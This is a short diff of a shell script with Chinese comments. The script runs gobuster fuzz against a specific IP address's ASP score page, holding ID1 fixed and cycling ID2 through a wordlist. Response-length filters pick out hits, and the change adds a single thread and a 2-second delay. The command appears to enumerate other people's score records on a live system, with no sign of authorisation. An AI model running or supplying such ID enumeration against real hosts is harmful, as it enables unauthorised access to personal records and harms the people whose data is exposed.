@@ -18,13 +18,7 @@ echo "為了保護伺服器，設定延遲 2 秒且單執行緒 (這會跑很久
 # --delay 2s: 每個請求延遲 2 秒 (重要！)
 # -v: 顯示詳細資訊
 
-gobuster fuzz \
-  -u "http://163.16.246.199/s11/reg/score/20251124.asp?ID1=1420622&ID2=FUZZ" \
-  -w ids.txt \
-  --exclude-length 9820-9920 \
-  --excludestatuscodes 500
-#  -t 1 \
-#  --delay 2s
+gobuster fuzz -u "http://163.16.246.199/s11/reg/score/20251124.asp?ID1=1420622&ID2=FUZZ" -w ids.txt --exclude-length 9820-9920 --excludestatuscodes 500 -t 1 --delay 2s
 
 # 掃描結束後刪除暫存字典
 # rm ids.txt
